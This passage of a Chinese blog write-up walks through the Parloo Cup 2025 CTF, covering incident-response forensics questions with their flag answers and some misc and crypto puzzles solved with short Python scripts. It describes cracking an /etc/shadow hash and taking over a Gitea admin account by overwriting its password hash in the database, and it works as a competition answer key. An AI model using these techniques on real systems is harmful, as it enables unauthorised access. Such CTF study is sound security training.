class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(encrypted)</span><br></pre></td></tr></table></figure><p>然后不知道怎么推出来的密钥是MySecretKey，看其他wp说是根据flag的头部是palu{推出来的，不懂（</p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">custom_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    decrypted = []</span><br><span class="line">    key_bytes = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> key]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="number">2</span>):</span><br><span class="line">        hex_byte = ciphertext[i:i+<span class="number">2</span>]</span><br><span class="line">        substituted = <span class="built_in">int</span>(hex_byte, <span class="number">16</span>)</span><br><span class="line">        xored = ((substituted &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | ((substituted &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        xor_key = key_bytes[(i // <span class="number">2</span>) % <span class="built_in">len</span>(key_bytes)]</span><br><span class="line">        shifted = xored ^ xor_key</span><br><span class="line"></span><br><span class="line">        original_char_code = shifted - ((i // <span class="number">2</span>) % <span class="number">5</span> + <span class="number">1</span>)</span><br><span class="line">        decrypted.append(<span class="built_in">chr</span>(original_char_code))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;MySecretKey&quot;</span></span><br><span class="line">ciphertext = <span class="string">&quot;c3a1c3c13e326020c3919093e1260525045e&quot;</span></span><br><span class="line">plaintext = custom_decrypt(ciphertext, key)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure><p>palu{Password-000}</p><h2 id="section-23">24</h2><p><strong>提交恶意维权软件的名称作为flag进行提交</strong></p><p>就是第17题中那个程序</p><p>palu{svhost}</p><h2 id="section-24">25</h2><p><strong>提交恶意程序的外联地址</strong></p><p>在palu03机器中，用户文件夹下有个明显奇怪的用python写的ipconfig程序</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747898114891-0ee1d71a-fe08-41c8-86f9-70b66d6dd154.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>简单逆向一下就能看到ip</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747898489537-7e1e32fa-6888-41f9-87bf-b383f70a11c3.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747898548470-53c83233-ae1b-4494-94d2-43ad0cef3b6d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{88.173.90.103}</p><h2 id="section-25">26</h2><p><strong>提交攻击者使用的恶意dnslog域名作为flag进行提交</strong></p><p>继续看之前的日志</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747899149467-033f66d7-c1ad-49f3-98b9-fbd8db4a1452.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{np85qqde.requestrepo.com}</p><h2 id="section-26">27</h2><p><strong>提交寻找反序列化漏洞的端口作为flag进行提交</strong></p><p>都是常见服务端口，除了8081前面用过了，那就只能是9999了</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747899322980-bce34261-cadd-46c0-bf33-b5f2c64dd61d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{9999}</p><h2 id="section-27">28</h2><p><strong>提交web服务泄露的密钥作为flag进行提交</strong></p><p>在/opt下有个adminAF.jar</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747899959110-14effb1a-2ba0-4e70-9e7d-93b966bb6622.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿出来逆向一下</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747900166709-86890ded-132e-4481-b316-514d867818c0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{QZYysgMYhG6/CzIJlVpR2g==}</p><h2 id="section-28">29*</h2><p><strong>提交攻击者开始攻击的时间作为flag进行提交。flag各式为palu{xxxx/xx/xx:xx:xx:xx}</strong></p><p>未知flag</p><h2 id="section-29">30</h2><p><strong>提交攻击者在server中留下的账户密码作为flag进行提交。flag格式为palu{username/password}</strong></p><p>查看/etc/shadow</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747900380817-8755c748-94d0-4e87-81c7-238a0f78ac1a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>jtr爆破</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747900603728-41067e47-7e6e-4c8e-93a2-b4c9346e3d57.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{parloohack/123456}</p><h2 id="section-30">31</h2><p><strong>提交攻击者维权方法的名称作为flag进行提交</strong></p><p>可以看到开机自启项中有一个可疑服务</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747900881184-0b2f8c02-2e23-4bea-aca3-10bd07acd031.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{parloohack_script.service}</p><h2 id="section-31">32</h2><p><strong>提交攻击者留下的木马md5后作为flag进行提交</strong></p><p>就是第12题中的aa</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747901057694-24cd4092-4f50-4d71-86ad-3cbfbfe97e0a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{4123940b3911556d4bf79196cc008bf4}</p><h2 id="section-32">33</h2><p><strong>提交攻击者留下的溯源信息作为flag进行提交</strong></p><p>在palu02机器中，google浏览器中保存了两个用户，其中一个用户的备注里有flag</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747901276083-6e789e27-a161-4e02-ab51-4c16232f10f7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{X5E1yklz1oAdyHBZ}</p><h2 id="section-33">34</h2><p><strong>提交攻击者的githubID作为flag进行提交</strong></p><p>上面的用户名是一个QQ号码，访问这个账号的空间有一条说说</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747901534926-141d3a9e-436a-4da4-9e5a-7516f9c2c878.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{ParlooSEc}</p><h2 id="section-34">35</h2><p><strong>提交攻击者在github下留下的的内容作为flag进行提交</strong></p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747901665658-8819c454-165e-41e3-973d-d0a1facb7d54.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{s5o3WkX33hptyJjk}</p><h2 id="section-35">36</h2><p><strong>提交恶意用户的数量作为flag进行提交</strong></p><p>palu01机器中除了Parloo用户外还有99个用户</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747901770754-c35edb53-9a09-4c90-b026-940138e3293c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{99}</p><h2 id="section-36">37</h2><p><strong>提交恶意用户的默认密码作为flag进行提交</strong></p><p>在palu01机器上可以找到一个叫a.vbs的脚本，是用来生成用户的</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747902141506-b9a516bc-0307-4f62-8b3b-42e76470079f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747902189846-bdf3fd31-cbb4-4c57-b965-5c4cba14c257.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{123456}</p><h2 id="section-37">38</h2><p><strong>提交业务数据中攻击者留下的信息作为flag进行提交</strong></p><p>连接mysql服务器中的gitea的数据库</p><p>看user表，有一个用户的密码是flag</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747902459929-7933319c-f2f4-4d1d-a83c-51448ae4e954.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{crP1ZIVfqrkfdhGy}</p><h2 id="section-38">39</h2><p><strong>提交私人git仓库中留下的内容作为flag进行提交</strong></p><p>自己注册一个账户，然后把admin账户的passwd，rands，salt三个列都替换成我们新生成账户的</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747902685325-bd654912-bb9f-493b-bc66-7edaa58234cd.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用我们新帐户的密码就能登陆admin，查看git仓库</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747902932418-8603124d-18de-4311-b1f3-2171ef0590db.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747902957139-af9179eb-7c46-4c38-b8c0-a5d4f223369b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="section-39">40</h2><p><strong>提交存在在mysql服务器中的恶意程序的MD5作为flag进行提交</strong></p><p>存在一个叫.a的程序</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747903116602-47673a45-486d-4f89-b095-5938d04eeba4.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747903191036-cae3eedf-ebf7-4d04-8dd5-e59c3c5ef950.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{ba7c9fc1ff58b48d0df5c88d2fcc5cd1}</p><h2 id="section-40">41</h2><p><strong>提交恶意程序中模拟c2通信的函数名称作为flag进行提交</strong></p><p>把.a提取出来逆向一下就行</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747903380304-f2f9fb51-dfb6-4f59-b26b-18865658ae40.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{simulate_network_communication}</p><h2 id="section-41">42</h2><p><strong>提交恶意程序创建隐藏文件的名称作为flag提交</strong></p><p>进入加密函数看一下</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747903481651-74237f81-4110-4239-b87a-2a69fd436f34.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{.malware_log.txt}</p><h2 id="section-42">43</h2><p><strong>提交恶意程序中模拟权限提升的函数作为flag进行提交</strong></p><p>由第41题</p><p>palu{simulate_privilege_escalation}</p><h2 id="section-43">44</h2><p><strong>提交被钓鱼上线的用户名作为flag进行提交</strong></p><p>palu02机器中还有一段聊天记录</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747903829028-43adab84-b583-430c-8a3f-898e67070a85.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{Parloo-子怡}</p><h2 id="section-44">45</h2><p><strong>提交恶意程序的所在路径作为flag进行提交</strong></p><p>由上题</p><p>palu{C:-沉沉}</p><h2 id="section-45">46</h2><p><strong>分析恶意程序的反连地址作为flag进行提交</strong></p><p>从google浏览器的历史记录中就能看出</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747904048187-684f8359-05d0-4e94-8877-b89f4a6e695d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{47.101.213.153}</p><h2 id="section-46">47</h2><p><strong>提交恶意c2的服务器登录的账号密码作为flag进行提交。flag格式为palu{username/password}</strong></p><p>看google浏览器密码管理器中保存的密码即可</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747904148716-dbcac2b0-dc80-470d-b0d7-e9a657461e25.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{admin/admin@qwer}</p><h1 id="畸形的爱">畸形的爱</h1><p><ahref="https://www.blog.st4rr.top/writeups/应急响应之畸形的爱.pdf">应急响应之畸形的爱.pdf</a></p><h2 id="section-47">1</h2><p><strong>提交攻击者使用的攻击ip地址1 flag格式为：palu{xxxx}附件下载地址：百度网盘https://pan.baidu.com/s/1otqDnpKTOEsPZQiWSE8ECg?pwd=6666 提取码: 6666夸克网盘 https://pan.quark.cn/s/46653bd06cca 123云盘https://www.123865.com/s/qDVvjv-zVBod 提取码:6666</strong>**解压密码：应急响应环境解压密码网络拓扑环境 Skills@@<spanclass="citation" data-cites="Skills">@Skills</span>@@<spanclass="citation" data-cites="Skills">@Skills</span> 畸行的爱Parloo&amp;zgsfsys&amp;onefox&amp;solar**juyt**</p><p>查看webserver中nginx的日志</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747916775093-e3671b64-67f7-495e-90af-dfda98f77f2d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{192.168.31.240}</p><h2 id="section-48">2</h2><p><strong>提交攻击者使用的攻击ip地址2.flag格式为：palu{xxxx}</strong></p><p>查看webserver的webdata容器中clean.sh的内容</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747918092130-20c4ecf4-82ce-4d2f-9218-f7411cad8447.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{192.168.31.11}</p><h2 id="section-49">3</h2><p><strong>题解攻击者暴力破解开始时间。flag为:palu{xx:xx:xx:xx}</strong></p><p>查看phpmyadmin容器的日志</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747918464671-a26bb021-759a-494a-910f-4a49b243c95b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{2025:03:05:58}</p><h2 id="section-50">4</h2><p><strong>提交攻击者留下的flag1 格式为palu{xxx}</strong></p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747958579843-0515e233-e6c7-4dcc-8639-79e0e5d9f99e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{pc3_zgsfqwerlkssaw}</p><h2 id="section-51">5</h2><p><strong>提交攻击者留下的flag2 格式为：palu{xxxx}</strong></p><p>继续翻看上面的flag1，后面执行了一条命令</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747958702021-8d9aec10-8170-4c1c-bcae-cb2a640bb35c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>查看a.bat</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747958775899-136c81cc-7ee6-441a-8fcc-6f47e89b1e3a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{nizhidaowoyouduoainima}</p><h2 id="section-52">6</h2><p><strong>提交攻击者留下的flag3 提交格式为：palu{xxxx}</strong></p><p>可以在webserver的/var/www/html/index.php中找到数据库的密码</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747978699049-a751e4f5-7645-46db-98d4-692d6045ffbc.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>查看数据库，可以看到content中有很多base64</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747979041500-9bed037d-afd8-4372-b715-b4965e4add0c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>其中Mr.chen的content解密即得flag</p><p>palu{sqlaabbccsbwindows}</p><h2 id="section-53">7</h2><p><strong>提交钓鱼文件的哈希32位大写</strong></p><p>在回收站中有个简历.zip，拿出来解压计算exe的哈希</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747966813855-a5fcdd48-38c9-421e-9edb-c8c41c2b4cd2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{2977CDAB8F3EE5EFDDAE61AD9F6CF203}</p><h2 id="section-54">8</h2><p><strong>提交攻击者留下的webshell-1密码格式为：palu{xxxx}</strong></p><p>查看webdata容器</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747967200640-7e56633b-69cf-4d65-a97a-c62aae730e48.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{hack}</p><h2 id="section-55">9*</h2><p><strong>提交攻击者开放端口 格式为：palu{xxx,xxx,xxx}</strong></p><p>通过第二题中的clean.sh可以看到一个1133端口，以及攻击者使用的ip</p><p>根据其他wp，查看webserver和win10的网络状态还能看到1144和8084端口，但是我并没有找到，可能是我虚拟机启动方式的问题吧（</p><p>palu{1133,1144,8084}</p><h2 id="section-56">10</h2><p><strong>提交攻击者留下的webshell密码2 格式为：palu{xxxx}</strong></p><p>在webserver的/var/www/html下也有马</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747983382520-a51972cd-d4c8-49d8-bf35-ef16c881260c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{00232}</p><h2 id="section-57">11</h2><p><strong>提交攻击者留下的隐藏账户的密码flag格式为：palu{xxxx}</strong></p><p>取证大师一把梭</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747984248969-c9f684cf-3097-4f88-9c4e-36886fe8b9c9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{wmx_love}</p><h2 id="section-58">12</h2><p><strong>[溯源]攻击者的邮箱. flag格式为：palu{xxx}</strong></p><p>逆向之前的简历.exe</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747984704317-a24de27e-3322-4091-be3f-d4406bae9c78.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以看到n0k4u这个人，去github上能找到他的账号</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747984814538-79ae717c-4f09-4e83-9b81-761379a5da94.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>通过api溯源到这个注册账号的邮箱</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747984950644-1d04f049-56d6-4a91-adb4-432cfa68ef3f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{n0k4u@outlook.com}</p><h2 id="section-59">13</h2><p><strong>提交溯源后得到的flag flag格式为：palu{xxx}</strong></p><p>上体找到的github账户唯一的repo内容如下</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747985161025-31118d12-fc3b-4293-b0d2-6a8dd562b467.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这个密语其实是个qq号，尝试添加好友就能看到flag</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747985411645-e7006085-a7a9-4e6b-a30f-f76ac4de803f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>palu{loveyouibiejv}</p><h1 id="ctf">CTF</h1><blockquote><p>再记录几道当时我做的CTF部分的题目吧 :)</p></blockquote><h2 id="misc">Misc</h2><h3 id="screenshot">screenshot</h3><p>有个笨比截图flag的时候不小心发到群里了,细心和反回撤的群友已经偷偷记录下来了</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747441927162-2dc02001-6c91-4363-8c50-8691a2804a1c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="时间折叠timefold-paradox">时间折叠（TimeFold Paradox）</h3><p>题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[1970-01-01 08:00:00] System boot sequence initiated</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 00000000fe ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 10000000ef ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 20000000e2 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 30000000fb ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 40000000f5 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 50000000da ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 60000000e6 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 70000000e7 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 80000000fd ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 90000000d1 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 100000000e7 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 110000000fd ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 120000000d1 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 130000000cf ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 140000000d1 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 150000000dd ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 160000000ef ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 170000000e3 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 180000000fe ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 190000000e2 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 200000000eb ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 210000000d1 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 220000000c8 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 230000000e2 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 240000000ef ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 250000000e9 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 260000000d1 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 270000000cd ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 280000000e6 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 290000000ef ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 300000000e0 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 310000000e9 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 320000000eb ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 330000000d1 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 340000000c3 ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 350000000eb ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 360000000af ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 370000000af ns</span><br><span class="line">[1970-01-01 08:00:00] SYSTEM ALERT: Time anomaly detected at 380000000f3 ns</span><br><span class="line">[1970-01-01 08:00:00] System entering chronostasis mode</span><br></pre></td></tr></table></figure><p>将每一个十六进制数的末两位提取出来然后xor brute force</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747444673031-4df10be4-0a4d-4f2f-8676-5621315f77a2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="时空交织的密语">时空交织的密语</h3><p>将二进制fromhex以后可以发现每四个字节是一组，而且前28位完全相同因此提取出每组的最低四位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;timestream.bin&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">s=f.read()</span><br><span class="line">x=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="built_in">len</span>(s),<span class="number">4</span>):</span><br><span class="line">    x+=<span class="built_in">str</span>(<span class="built_in">hex</span>(s[i]%<span class="number">16</span>)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><p>发现将第一个数字删去以后fromhex就能得到flag</p><figure><imgsrc="/images/Parloo杯2025初赛-writeup-复现/1747483643243-f804d7d3-a4bf-4f50-a3dd-da7c1ca8d41b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="几何闪烁的秘密">几何闪烁的秘密</h3><p>稍微把有字的帧分离一下，每一个图形内出现过的字是一段，每段出现三遍，但是每遍都会缺几个字符，把三遍结合起来看，最后把四段拼起来解base64就行</p><p>palu{master_of_geometry}</p><h3 id="时间循环的信使">时间循环的信使</h3><p>按照时间戳排序，如果|后面的字符都是一样的就提取出来，拼起来后fromhex</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;timeloop.log&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        stripped = line.strip()</span><br><span class="line">        <span class="keyword">if</span> stripped:</span><br><span class="line">            parts = stripped.split(<span class="string">&quot;|&quot;</span>)</span><br><span class="line">            data.append(parts)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="keyword">if</span> data[i][<span class="number">0</span>] &gt; data[j][<span class="number">0</span>]:</span><br><span class="line">            data[i], data[j] = data[j], data[i]</span><br><span class="line">res_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">    second_field = item[<span class="number">1</span>]</span><br><span class="line">    first_char = second_field[<span class="number">0</span>]</span><br><span class="line">    all_same = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> second_field:</span><br><span class="line">        <span class="keyword">if</span> ch != first_char:</span><br><span class="line">            all_same = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> all_same:</span><br><span class="line">        res_str += first_char</span><br><span class="line">hex_num = <span class="built_in">int</span>(res_str, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(hex_num))</span><br><span class="line"><span class="comment">#b&#x27;palu&#123;Time_1s_cycl1c@l_0x&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="crypto">Crypto</h2><h3 id="循环锁链">循环锁链</h3><p>flag的下一位是前一位xor的密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">s=f.read()</span><br><span class="line">tmp=<span class="number">112</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span 